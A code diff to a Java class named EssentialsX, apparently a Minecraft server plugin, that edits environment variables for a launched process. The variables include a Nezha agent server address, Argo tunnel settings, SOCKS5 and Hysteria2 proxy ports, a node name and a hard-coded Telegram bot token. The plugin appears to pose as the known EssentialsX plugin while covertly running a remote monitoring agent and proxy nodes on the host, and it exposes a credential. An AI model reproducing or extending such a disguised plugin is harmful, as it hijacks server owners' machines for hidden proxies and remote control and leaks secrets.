@@ -73,7 +73,7 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "9d539a5f-5bf4-4fd5-90e4-97fd9ed6b990");
+        env.put("UUID", "623e4871-4a2b-42f5-8d1f-5c1bffb9990a");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nznz.sss.xx.kg:443");
         env.put("NEZHA_PORT", "");
@@ -81,8 +81,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_PORT", "");
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "54294");
-        env.put("HY2_PORT", "54294");
+        env.put("S5_PORT", "55339");
+        env.put("HY2_PORT", "55339");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "8007060242:AAH0KVn0peZzRiQ7r5reJzCkuqjQTrlhQfw");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "Axent-eu");
+        env.put("NAME", "Axent-US");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
